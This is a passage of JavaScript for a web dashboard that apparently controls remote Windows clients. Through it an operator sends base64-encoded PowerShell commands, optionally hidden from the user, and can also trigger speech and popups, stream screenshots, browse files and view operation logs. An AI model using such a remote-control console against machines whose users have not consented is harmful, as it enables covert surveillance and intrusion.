                const clearBtn = $('ftp-filter-clear');
                if (clearBtn) clearBtn.style.display = ftpState.filterQuery ? 'block' : 'none';
                renderFtpItemsList();
                updateFtpStatusBar();
            });
        }

        $('ftp-filter-clear')?.addEventListener('click', () => {
            if (filterInput) filterInput.value = '';
            ftpState.filterQuery = '';
            $('ftp-filter-clear').style.display = 'none';
            renderFtpItemsList();
            updateFtpStatusBar();
            filterInput?.focus();
        });

        $('ftp-modal')?.addEventListener('click', e => {
            if (e.target === $('ftp-modal')) closeFtpBrowser(true);
        });

        // Browser back/forward & mobile native swipe back support (like usbftp)
        setupFtpHistoryListener();
    }

    // ═══════════════════════════════════════════════════════════════
    // OPERATIONS LOG MODULE
    // ═══════════════════════════════════════════════════════════════

    const logsState = {
        isOpen: false,
        user: null,
        logs: [],
        filterType: 'ALL',
        searchQuery: '',
        isLoading: false
    };
    let logsHistoryPushed = false;

    function formatLogTime(timeStr) {
        if (!timeStr) return '—';
        try {
            const parts = timeStr.replace('T', ' ').split(' ');
            if (parts.length >= 2) {
                const timePart = parts[1].split('.')[0];
                const datePart = parts[0];
                return `${datePart} ${timePart}`;
            }
            return timeStr;
        } catch {
            return timeStr;
        }
    }

    function openLogsModal(user) {
        const targetUser = user || runState.popupUser;
        if (!targetUser) return;

        logsState.isOpen = true;
        logsState.user = targetUser;
        logsState.searchQuery = '';
        logsState.filterType = 'ALL';

        const modal = $('logs-modal');
        if (modal) modal.style.display = 'flex';

        const targetLabel = $('logs-target-user');
        if (targetLabel) {
            targetLabel.textContent = `Client: ${getDisplayUsername(targetUser.username)}`;
        }

        const filterInput = $('logs-filter-input');
        if (filterInput) filterInput.value = '';
        const filterClear = $('logs-filter-clear');
        if (filterClear) filterClear.style.display = 'none';

        document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(pill => {
            pill.classList.toggle('active', pill.dataset.filter === 'ALL');
        });

        try {
            history.pushState({ modal: 'logs', username: targetUser.username }, '');
            logsHistoryPushed = true;
        } catch {}

        loadUserLogs(targetUser.username);
    }

    function closeLogsModal(pushHistory = false) {
        if (!logsState.isOpen) return;
        logsState.isOpen = false;
        const modal = $('logs-modal');
        if (modal) modal.style.display = 'none';

        if (pushHistory && logsHistoryPushed) {
            logsHistoryPushed = false;
            try {
                history.back();
            } catch {}
        } else {
            logsHistoryPushed = false;
        }
    }

    async function loadUserLogs(username, silent = false) {
        if (!username) return;
        const targetUser = logsState.user;

        if (targetUser?.demo || !runState.isConnected) {
            logsState.logs = [
                {
                    id: 105,
                    username: username,
                    op_type: 'SYSTEM',
                    details: 'Client registered and active (demo session)',
                    status: 'online',
                    created_at: new Date().toISOString().replace('T', ' ').substring(0, 19)
                },
                {
                    id: 104,
                    username: username,
                    op_type: 'COMMAND',
                    details: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5',
                    status: 'dispatched',
                    created_at: new Date(Date.now() - 180000).toISOString().replace('T', ' ').substring(0, 19)
                },
                {
                    id: 103,
                    username: username,
                    op_type: 'SPEAK',
                    details: 'Alert: System operational status confirmed',
                    status: 'dispatched',
                    created_at: new Date(Date.now() - 600000).toISOString().replace('T', ' ').substring(0, 19)
                },
                {
                    id: 102,
                    username: username,
                    op_type: 'SCREENSHOT',
                    details: 'Continuous screenshot stream toggled ON',
                    status: 'success',
                    created_at: new Date(Date.now() - 1800000).toISOString().replace('T', ' ').substring(0, 19)
                },
                {
                    id: 101,
                    username: username,
                    op_type: 'FTP',
                    details: 'Listed directory contents: C:\\Users',
                    status: 'success',
                    created_at: new Date(Date.now() - 3600000).toISOString().replace('T', ' ').substring(0, 19)
                }
            ];
            renderLogsList();
            return;
        }

        if (logsState.isLoading) return;
        logsState.isLoading = true;

        if (!silent) {
            const list = $('logs-list');
            if (list) {
                list.innerHTML = `
                    <div class="logs-empty-state">
                        <i class="bi bi-arrow-repeat logs-empty-icon" style="animation: spin 1s linear infinite;"></i>
                        <div>Loading operations log...</div>
                    </div>
                `;
            }
        }

        try {
            const res = await fetch(`${VPS_URL}/api/logs/${encodeURIComponent(username)}?limit=300`, {
                headers: { 'x-password': runState.password }
            });
            if (res.ok) {
                const data = await res.json();
                logsState.logs = Array.isArray(data) ? data : [];
            } else {
                logsState.logs = [];
            }
        } catch (err) {
            console.error('Failed to load logs:', err);
            logsState.logs = [];
        } finally {
            logsState.isLoading = false;
            renderLogsList();
        }
    }

    function renderLogsList() {
        const list = $('logs-list');
        const counter = $('logs-counter');
        if (!list) return;

        let items = logsState.logs || [];

        if (logsState.filterType && logsState.filterType !== 'ALL') {
            const fType = logsState.filterType.toUpperCase();
            items = items.filter(l => (l.op_type || '').toUpperCase() === fType);
        }

        if (logsState.searchQuery) {
            const q = logsState.searchQuery.toLowerCase();
            items = items.filter(l =>
                (l.details || '').toLowerCase().includes(q) ||
                (l.op_type || '').toLowerCase().includes(q) ||
                (l.status || '').toLowerCase().includes(q) ||
                (l.created_at || '').toLowerCase().includes(q)
            );
        }

        if (counter) {
            const isFiltered = (logsState.filterType && logsState.filterType !== 'ALL') || !!logsState.searchQuery;
            counter.textContent = `${items.length} log${items.length !== 1 ? 's' : ''}${isFiltered ? ' (filtered)' : ''}`;
        }

        if (items.length === 0) {
            const hasFilters = (logsState.filterType && logsState.filterType !== 'ALL') || !!logsState.searchQuery;
            list.innerHTML = `
                <div class="logs-empty-state">
                    <i class="bi bi-journal-x logs-empty-icon"></i>
                    <div>${hasFilters ? 'No operation logs match your search or filter.' : 'No operation logs recorded yet for this client.'}</div>
                </div>
            `;
            return;
        }

        const html = items.map(log => {
            const opType = (log.op_type || 'COMMAND').toUpperCase();
            const typeClass = `log-type-${escapeHtml(opType)}`;
            const timeFormatted = formatLogTime(log.created_at);
            const detailsEsc = escapeHtml(log.details || '');
            const statusEsc = log.status ? `<div class="log-status-text">${escapeHtml(log.status)}</div>` : '';

            return `
                <div class="log-entry" data-id="${log.id || ''}">
                    <div class="log-time" title="${escapeHtml(log.created_at || '')}">${timeFormatted}</div>
                    <span class="log-type-tag ${typeClass}">${escapeHtml(opType)}</span>
                    <div class="log-content">
                        <div class="log-detail-text">${detailsEsc}</div>
                        ${statusEsc}
                    </div>
                    <div class="log-actions">
                        <button type="button" class="log-copy-btn" title="Copy operation details" data-copy="${encodeURIComponent(log.details || '')}">
                            <i class="bi bi-clipboard"></i>
                        </button>
                    </div>
                </div>
            `;
        }).join('');

        list.innerHTML = html;

        list.querySelectorAll('.log-copy-btn').forEach(btn => {
            btn.addEventListener('click', e => {
                e.stopPropagation();
                const textToCopy = decodeURIComponent(btn.dataset.copy || '');
                if (!textToCopy) return;
                navigator.clipboard.writeText(textToCopy).then(() => {
                    btn.innerHTML = '<i class="bi bi-check2"></i>';
                    setTimeout(() => { btn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 1500);
                }).catch(() => {
                    alert('Copied: ' + textToCopy);
                });
            });
        });
    }

    async function clearUserLogs() {
        const user = logsState.user;
        if (!user) return;
        const name = getDisplayUsername(user.username);
        if (!confirm(`Are you sure you want to clear all operation logs for ${name}?`)) return;

        if (user.demo || !runState.isConnected) {
            logsState.logs = [];
            renderLogsList();
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/logs/${encodeURIComponent(user.username)}/clear`, {
                method: 'POST',
                headers: { 'x-password': runState.password }
            });
            if (res.ok) {
                logsState.logs = [];
                renderLogsList();
            } else {
                alert('Failed to clear logs on server.');
            }
        } catch (err) {
            alert('Error clearing logs: ' + err.message);
        }
    }

    function handleRealtimeLog(data) {
        if (!data || !data.username) return;
        if (logsState.isOpen && logsState.user && logsState.user.username === data.username) {
            if (!logsState.logs.some(l => l.id === data.id)) {
                logsState.logs.unshift(data);
                renderLogsList();
            }
        }
    }

    function initLogsModal() {
        $('logs-close-btn')?.addEventListener('click', () => closeLogsModal(true));
        $('logs-refresh-btn')?.addEventListener('click', () => {
            if (logsState.user) loadUserLogs(logsState.user.username, false);
        });
        $('logs-clear-btn')?.addEventListener('click', clearUserLogs);

        const filterInput = $('logs-filter-input');
        const filterClear = $('logs-filter-clear');
        if (filterInput) {
            filterInput.addEventListener('input', e => {
                logsState.searchQuery = e.target.value.trim();
                if (filterClear) filterClear.style.display = logsState.searchQuery ? 'block' : 'none';
                renderLogsList();
            });
        }

        filterClear?.addEventListener('click', () => {
            if (filterInput) filterInput.value = '';
            logsState.searchQuery = '';
            filterClear.style.display = 'none';
            renderLogsList();
            filterInput?.focus();
        });

        document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(pill => {
            pill.addEventListener('click', () => {
                document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(p => p.classList.remove('active'));
                pill.classList.add('active');
                logsState.filterType = pill.dataset.filter || 'ALL';
                renderLogsList();
            });
        });

        $('logs-modal')?.addEventListener('click', e => {
            if (e.target === $('logs-modal')) closeLogsModal(true);
        });

        window.addEventListener('popstate', e => {
            if (logsState.isOpen && (!e.state || e.state.modal !== 'logs')) {
                closeLogsModal(false);
            }
        });
    }

    // ── Send Command / Fetch Data ──
    async function doSendPopup() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        const mode = runState.popupMode;
        const val = $('popup-input')?.value.trim() || '';
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            closePopup();
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        if (mode === 'imager') {
            if (!imagerState.imageData) {
                alert('Please upload an image first.');
                return;
            }
            isSendingCommand = true;
            const captionVal = ($('imager-caption-input')?.value || '').trim();
            try {
                const res = await fetch(`${VPS_URL}/api/image`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                    body: JSON.stringify({
                        username: user.username,
                        image: imagerState.imageData,
                        caption: captionVal
                    })
                });
                if (!res.ok) {
                    const err = await res.json().catch(() => ({}));
                    alert(err.message || 'Failed to dispatch image to client.');
                    return;
                }
                closePopup();
                fetchData();
            } catch (err) {
                alert('Failed to send image: ' + err.message);
            } finally {
                isSendingCommand = false;
            }
            return;
        }

        let rawCmd = '';
        if (mode === 'cmd') {
            rawCmd = val;
        } else if (val) {
            const msg = formatPSString(val);
            if (mode === 'speak') {
                rawCmd = `$s=New-Object -Com SAPI.SpVoice;$s.Volume=${runState.selectedSpkVolume};$s.Rate=${runState.selectedSpkSpeed};$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${runState.selectedVoice}*'};$s.Speak(${msg})`;
            } else {
                rawCmd = `(New-Object -Com WScript.Shell).Popup(${msg})`;
            }
        }

        if (!rawCmd && mode !== 'cmd') {
            closePopup();
            return;
        }

        isSendingCommand = true;
        const encodedCmd = rawCmd ? (window.RunUtils ? window.RunUtils.encodeBase64(rawCmd) : btoa(rawCmd)) : '';
        const body = {
            username: user.username,
            cmd: encodedCmd,
            visible: mode === 'cmd' ? (runState.selectedVis ? 1 : 0) : 0
        };

        try {
            const res = await fetch(`${VPS_URL}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify(body)
            });
            if (!res.ok) return;
            closePopup();
            fetchData();
        } catch {} finally {
            isSendingCommand = false;
        }
    }

    async function doViewOutput(user) {
        if (!user) return;
        openLogsModal(user);
    }

    async function fetchData() {
        if (!runState.isConnected || runState.fetchInFlight) return;
        initDashboardSocket();
        runState.fetchInFlight = true;
        try {
            const res = await fetch(`${VPS_URL}/api/clients`, {
                headers: { 'x-password': runState.password }
            });
            const nextRows = await res.json();
            const nextSorted = sortRows(nextRows);
            const sig = buildRowsRenderSignature(nextSorted, true);
            runState.rows = nextRows;
            runState.sortedRows = nextSorted;
            if (sig === runState.lastRenderSignature) return;
            runState.lastRenderSignature = sig;
            renderGrid();
        } catch {} finally {
            runState.fetchInFlight = false;
        }
    }

    // ── Visibility ──
    async function setPopupVisibility(nextVisible) {
        if (runState.popupMode !== 'cmd' || !runState.popupUser) return;
        runState.selectedVis = !!nextVisible;
        runState.popupUser.visible = runState.selectedVis;
        const idx = runState.rows.findIndex(r => r.username === runState.popupUser.username);
        if (idx !== -1) {
            runState.rows[idx] = { ...runState.rows[idx], visible: runState.selectedVis };
        }
        updateOptionsUI();
        renderGrid();

        if (!runState.isConnected || runState.popupUser.demo) return;
        try {
            await fetch(`${VPS_URL}/api/visibility`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: runState.popupUser.username, visible: runState.selectedVis ? 1 : 0 })
            });
        } catch {}
    }

    // ── Tab Autofill Hints ──
    function syncTabHint() {
        const ta = $('popup-input');
        const wrap = $('textarea-wrap');
        if (!ta || !wrap) return;
        const focused = document.activeElement === ta;
        wrap.classList.toggle('show-hint', focused);
        if ($('tab-autofill-hint')) $('tab-autofill-hint').style.display = (focused && ta.value === '') ? 'flex' : 'none';
        if ($('tab-unfocus-hint')) $('tab-unfocus-hint').style.display = focused ? 'flex' : 'none';
    }

    function autofillPopupInput() {
        const ta = $('popup-input');
        if (!ta || ta.value !== '') return;
        ta.value = getPopupAutofillText();
        runState.cmdLoadedFromUpload = false;
        ta.selectionStart = ta.selectionEnd = ta.value.length;
        updateOptionsUI();
        syncTabHint();
    }

    function unfocusPopupInput() {
        $('popup-input')?.blur();
        syncTabHint();
    }

    // ── Initialization & Event Listeners ──
    function init() {
        applyTheme(runState.themeSelection);
        setConnectionState(false);
        sizeActionModeDropdown();

        // Theme dropdown
        const themeBtn = $('run-theme-btn');
        const themeMenu = $('runThemeMenu');
        if (themeBtn && themeMenu) {
            themeBtn.addEventListener('click', () => {
                themeBtn.classList.toggle('open');
                themeMenu.classList.toggle('open');
            });
            themeMenu.querySelectorAll('.file-dropdown-item').forEach(item => {
                item.addEventListener('click', () => {
                    applyTheme(item.dataset.themeVal);
                    themeBtn.classList.remove('open');
                    themeMenu.classList.remove('open');
                });
            });
            document.addEventListener('click', e => {
                if (!$('runThemeWrap')?.contains(e.target)) {
                    themeBtn.classList.remove('open');
                    themeMenu.classList.remove('open');
                }
            });
        }

        // Connect / disconnect buttons
        const handleConnect = () => {
            if (runState.isConnected) {
                if (!confirm('Disconnect now?')) return;
                disconnectAndReset();
                return;
            }
            promptAndConnect();
        };
        ['run-connect-btn', 'sidebar-connect-btn'].forEach(id => $(id)?.addEventListener('click', handleConnect));

        // Sidebar theme buttons
        document.querySelectorAll('.sidebar-theme-btn').forEach(btn => {
            if (btn.dataset.themeVal) {
                btn.addEventListener('click', () => applyTheme(btn.dataset.themeVal));
            }
        });

        // Sidebar action mode buttons
        document.querySelectorAll('#sidebar-mode-list .sidebar-theme-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                if (!runState.popupUser) return;
                applyActionMode(btn.dataset.mode);
                closeSidebar();
            });
        });

        // Sidebar download
        $('sidebar-download-btn')?.addEventListener('click', async () => {
            if (FramesApp?.downloadCurrentFrame) await FramesApp.downloadCurrentFrame();
            closeSidebar();
        });

        // Sidebar open / close
        const sidebar = $('sidebar');
        const overlay = $('sidebarOverlay');
        function openSidebar() {
            if (window.__getCurrentMode?.() === 'frames' && window.__framesMenuDisabled) return;
            sidebar?.classList.add('open');
            overlay?.classList.add('open');
        }
        function closeSidebar() {
            sidebar?.classList.remove('open');
            overlay?.classList.remove('open');
        }
        $('hamburgerBtn')?.addEventListener('click', openSidebar);
        overlay?.addEventListener('click', closeSidebar);
        $('sidebarClose')?.addEventListener('click', closeSidebar);

        setInterval(fetchData, 10000);

        // Grid interactions
        const grid = $('user-grid');
        if (grid) {
            grid.addEventListener('mousemove', e => {
                const card = e.target.closest('.user-card');
                if (!card) {
                    if (runState.interactionMode === 'hover') clearActiveSelection();
                    return;
                }
                const username = card.dataset.username;
                if (!username || username === runState.activeUsername) return;
                const user = getRenderableRows().find(u => u.username === username);
                if (user) setActiveSelection(user, 'hover');
            });

            grid.addEventListener('mouseleave', () => {
                if (runState.interactionMode === 'hover') clearActiveSelection();
            });

            grid.addEventListener('click', e => {
                const btn = e.target.closest('.card-btn');
                if (!btn) return;
                const card = e.target.closest('.user-card');
                if (!card) return;
                const username = card.dataset.username;
                if (!username) return;
                const user = getRenderableRows().find(u => u.username === username);
                if (!user) return;
                const action = btn.dataset.action;
                if (action === 'ps') openPopup('cmd', user);
                if (action === 'output') doViewOutput(user);
            });
        }

        // Target dropdown
        $('popup-target-label')?.addEventListener('click', e => {
            e.stopPropagation();
            if (!runState.popupUser) return;
            renderTargetDropdown();
            $('popup-target-label')?.classList.toggle('open');
            $('actionTargetMenu')?.classList.toggle('open');
        });
        document.addEventListener('click', e => {
            if (!$('actionTargetWrap')?.contains(e.target)) closeTargetDropdown();
        });

        // Action mode dropdown
        $('action-mode-btn')?.addEventListener('click', e => {
            e.stopPropagation();
            if (!runState.popupUser) return;
            $('action-mode-btn')?.classList.toggle('open');
            $('actionModeMenu')?.classList.toggle('open');
        });
        document.querySelectorAll('#actionModeMenu .file-dropdown-item').forEach(item => {
            item.addEventListener('click', () => {
                if (!runState.popupUser) return;
                applyActionMode(item.dataset.mode);
            });
        });
        document.addEventListener('click', e => {
            if (!$('actionModeWrap')?.contains(e.target)) closeActionModeDropdown();
        });

        // Option button listeners
        if ($('voice-david')) $('voice-david').onclick = () => { runState.selectedVoice = 'David'; updateOptionsUI(); };
        if ($('voice-zira')) $('voice-zira').onclick = () => { runState.selectedVoice = 'Zira'; updateOptionsUI(); };
        if ($('spk-volume')) $('spk-volume').oninput = e => { runState.selectedSpkVolume = Number(e.target.value); updateOptionsUI(); };
        if ($('spk-speed')) $('spk-speed').oninput = e => { runState.selectedSpkSpeed = Number(e.target.value); updateOptionsUI(); };
        if ($('vis-true')) $('vis-true').onclick = () => setPopupVisibility(true);
        if ($('vis-false')) $('vis-false').onclick = () => setPopupVisibility(false);
        if ($('upload-btn')) $('upload-btn').onclick = () => $('file-upload')?.click();
        $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
        $('ftp-browser-btn')?.addEventListener('click', openFtpBrowser);
        $('user-logs-btn')?.addEventListener('click', () => {
            if (runState.popupUser) openLogsModal(runState.popupUser);
        });
        $('single-screenshot-btn')?.addEventListener('click', doTakeSingleScreenshot);
        $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
        $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
        initFtpBrowser();
        initLogsModal();

        const fileUpload = $('file-upload');
        if (fileUpload) {
            fileUpload.onchange = e => {
                const file = e.target.files[0];
                if (!file) return;
                const reader = new FileReader();
                reader.onload = ev => {
                    if ($('popup-input')) $('popup-input').value = ev.target.result;
                    runState.cmdLoadedFromUpload = true;
                    $('popup-input')?.focus();
                    updateOptionsUI();
                };
                reader.readAsText(file);
                e.target.value = '';
            };
        }

        $('popup-input')?.addEventListener('input', () => {
            runState.cmdLoadedFromUpload = false;
            updateOptionsUI();
        });

        // Global keyboard shortcuts
        document.addEventListener('keydown', e => {
            if (logsState.isOpen) {
                if (e.key === 'Escape') {
                    closeLogsModal(true);
                    return;
                }
            }
            if (ftpState.isOpen) {
                if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
                    e.preventDefault();
                    if (ftpState.isEditing) doFtpSaveFile();
                    return;
                }
                if (e.key === 'Escape') {
                    if ($('ftp-dialog-overlay')?.style.display !== 'none') {
                        $('ftp-dialog-cancel')?.click();
                        return;
                    }
                    if ($('ftp-preview-drawer')?.style.display !== 'none') {
                        closeFtpPreview(true);
                    } else {
                        closeFtpBrowser(true);
                    }
                    return;
                }
                const activeTag = document.activeElement?.tagName;
                if (activeTag === 'INPUT' || activeTag === 'TEXTAREA' || document.activeElement?.isContentEditable) return;

                if (e.key === 'Backspace' && ftpState.parentPath) {
                    e.preventDefault();
                    loadFtpPath(ftpState.parentPath, true);
                    return;
                }
                if (e.key === 'r' || e.key === 'R') {
                    e.preventDefault();
                    loadFtpPath(ftpState.currentPath, false);
                    return;
                }
                return;
            }

            if (!runState.popupMode && window.__getCurrentMode?.() !== 'run') return;
            if (runState.popupMode) {
                if (e.key === 'Escape') closePopup();
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    doSendPopup();
                }
                return;
            }
            const activeTag = document.activeElement?.tagName;
            if (activeTag === 'INPUT' || activeTag === 'TEXTAREA' || document.activeElement?.isContentEditable) return;

            if (e.key === 'Escape') {
                clearActiveSelection();
                return;
            }
            const arrowKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
            if (arrowKeys.includes(e.key)) {
                e.preventDefault();
                const cards = document.querySelectorAll('.user-card');
                if (!cards.length) return;
                const computedCols = getComputedStyle(grid).gridTemplateColumns.trim().split(/\s+/).filter(Boolean).length;
                const cols = Math.max(1, computedCols);
                const sorted = getRenderableRows();
                const cur = runState.activeUsername ? sorted.findIndex(u => u.username === runState.activeUsername) : -1;
                let next = cur < 0 ? 0 : cur;
                if (cur >= 0) {
                    if (e.key === 'ArrowRight') next = Math.min(next + 1, cards.length - 1);
                    if (e.key === 'ArrowLeft') next = Math.max(next - 1, 0);
                    if (e.key === 'ArrowDown') next = Math.min(next + cols, cards.length - 1);
                    if (e.key === 'ArrowUp') next = Math.max(next - cols, 0);
                }
                const nextUser = sorted[next];
                if (nextUser) setActiveSelection(nextUser, 'keyboard', { scroll: true });
                return;
            }
            const u = runState.activeUsername ? getRenderableRows().find(row => row.username === runState.activeUsername) : null;
            if (!u) return;
            const alive = getStatus(u) === 'green';
            const key = e.key.toLowerCase();
            if (key === 'c' && alive) openPopup('cmd', u);
            if (key === 's' && alive) {
                runState.selectedVoice = e.shiftKey ? 'Zira' : 'David';
                openPopup('speak', u);
            }
            if (key === 'a' && alive) openPopup('popup_msg', u);
            if (key === 'i' && alive) openPopup('imager', u);
            if (key === 'v') doViewOutput(u);
        });

        document.addEventListener('click', e => {
            if (runState.popupMode) return;
            if (window.__getCurrentMode?.() !== 'run') return;
            if (!e.target.closest('.user-card')) clearActiveSelection();
        });

        // Initial connection setup
        if (!runState.password) {
            const ok = promptAllCredentials();
            if (!ok) {
                renderGrid();
            } else {
                if ($('user-grid')) $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
                connectWithCredentials({ notifyOnFail: false }).then(success => {
                    if (!success) renderGrid();
                });
            }
        } else {
            if ($('user-grid')) $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
            connectWithCredentials({ notifyOnFail: false }).then(success => {
                if (!success) renderGrid();
            });
        }

        if ($('popup-cancel')) $('popup-cancel').onclick = closePopup;
        if ($('popup-confirm')) $('popup-confirm').onclick = doSendPopup;

        // Imager upload & dropzone listeners
        const imagerDropzone = $('imager-dropzone');
        const imagerFileInput = $('imager-file-input');
        const imagerRemoveBtn = $('imager-remove-btn');
        const imagerCaptionInput = $('imager-caption-input');

        if (imagerDropzone && imagerFileInput) {
            imagerDropzone.addEventListener('click', e => {
                if (e.target.closest('#imager-remove-btn') || e.target.closest('.imager-top-bar')) return;
                imagerFileInput.click();
            });

            imagerDropzone.addEventListener('keydown', e => {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    imagerFileInput.click();
                }
            });

            imagerFileInput.addEventListener('change', e => {
                if (e.target.files && e.target.files[0]) {
                    processImagerFile(e.target.files[0]);
                }
            });

            imagerDropzone.addEventListener('dragover', e => {
                e.preventDefault();
                e.dataTransfer.dropEffect = 'copy';
                imagerDropzone.classList.add('dragover');
            });
            imagerDropzone.addEventListener('dragenter', e => {
                e.preventDefault();
                imagerDropzone.classList.add('dragover');
            });
            imagerDropzone.addEventListener('dragleave', e => {
                if (!imagerDropzone.contains(e.relatedTarget)) {
                    imagerDropzone.classList.remove('dragover');
                }
            });
            imagerDropzone.addEventListener('drop', e => {
                e.preventDefault();
                imagerDropzone.classList.remove('dragover');
                if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    processImagerFile(e.dataTransfer.files[0]);
                }
            });
        }

        if (imagerRemoveBtn) {
            imagerRemoveBtn.addEventListener('click', e => {
                e.stopPropagation();
                resetImager();
            });
        }

        if (imagerCaptionInput) {
            imagerCaptionInput.addEventListener('keydown', e => {
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    doSendPopup();
                }
            });
        }

        // Paste support for Imager
        window.addEventListener('paste', e => {
            if (runState.popupMode !== 'imager') return;
            const items = e.clipboardData?.items;
            if (!items) return;
            for (let i = 0; i < items.length; i++) {
                if (items[i].type.indexOf('image') !== -1) {
                    const file = items[i].getAsFile();
                    if (file) {
                        processImagerFile(file);
                        break;
                    }
                }
            }
        });

        // Tab hints & autofill
        const taInput = $('popup-input');
        if (taInput) {
            ['focus', 'blur', 'input'].forEach(evt => taInput.addEventListener(evt, syncTabHint));
            $('tab-autofill-hint')?.addEventListener('mousedown', e => e.preventDefault());
            $('tab-unfocus-hint')?.addEventListener('mousedown', e => e.preventDefault());
            $('tab-autofill-hint')?.addEventListener('click', () => {
                taInput.focus();
                autofillPopupInput();
            });
            $('tab-unfocus-hint')?.addEventListener('click', unfocusPopupInput);
            taInput.addEventListener('keydown', e => {
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    e.stopPropagation();
                    if (e.repeat) return;
                    doSendPopup();
                }
                if (e.key === 'Tab') {
                    e.preventDefault();
                    if (e.shiftKey) {
                        unfocusPopupInput();
                    } else if (taInput.value === '') {
                        autofillPopupInput();
                    } else {
                        const s = taInput.selectionStart;
                        const end = taInput.selectionEnd;
                        taInput.value = taInput.value.slice(0, s) + '    ' + taInput.value.slice(end);
                        taInput.selectionStart = taInput.selectionEnd = s + 4;
                    }
                }
            });
        }
    }

    return { init };
})();

document.addEventListener('DOMContentLoaded', () => {
    RunApp.init();
});